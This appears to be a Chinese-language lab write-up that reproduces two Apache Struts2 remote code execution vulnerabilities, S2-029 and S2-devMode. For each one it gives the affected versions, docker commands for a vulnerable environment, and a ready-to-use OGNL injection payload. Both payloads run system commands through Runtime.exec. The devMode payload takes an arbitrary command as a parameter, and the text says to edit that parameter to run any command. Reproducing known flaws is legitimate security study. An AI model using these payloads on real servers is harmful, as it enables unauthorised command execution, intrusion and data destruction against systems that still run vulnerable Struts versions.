原理：Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。

在Struts2中，如下的标签就调用了OGNL进行取值。

<p>parameters: <s:property value="#parameters.msg" /></p>

Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。

影响版本：Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）

复现步骤：

1\. 拉取漏洞环境镜像到本地

命令：docker pull medicean/vulapps:s\_struts2\_s2-029

2\. 启动环境

命令：docker run -d -p 8080:8080 medicean/vulapps:s\_struts2\_s2-029

3\. 访问192.168.50.118:8080/default.action

![](_v_images/20200819094615846_26673.png)

4.Poc利用

(%23\_memberAccess\["allowPrivateAccess"\]=true,%23\_memberAccess\["allowProtectedAccess"\]=true,%23\_memberAccess\["excludedPackageNamePatterns"\]=%23\_memberAccess\["acceptProperties"\],%23\_memberAccess\["excludedClasses"\]=%23\_memberAccess\["acceptProperties"\],%23\_memberAccess\["allowPackageProtectedAccess"\]=true,%23\_memberAccess\["allowStaticMethodAccess"\]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream()))

![](_v_images/20200819094615237_23834.png)

## S2-devMode 复现

原理：当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。

影响版本：当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。

复现步骤：

1\. 拉取漏洞环境到本地

命令：docker pull medicean/vulapps:s\_struts2\_s2-devmode

2\. 启动漏洞环境

命令：docker run -d -p 8080:8080 medicean/vulapps:s\_struts2\_s2-devmode

3\. 访问漏洞环境192.168.0.110

![](_v_images/20200819094614523_682.png)

4\. Poc利用

debug=browser&object=(%23\_memberAccess=@ognl.OgnlContext@DEFAULT\_MEMBER_ACCESS)%3f(%23context\[%23parameters.rpsobj\[0\]\].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command\[0\]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id

![](_v_images/20200819094613904_18113.png)

注：修改参数 command 的值为要执行的命令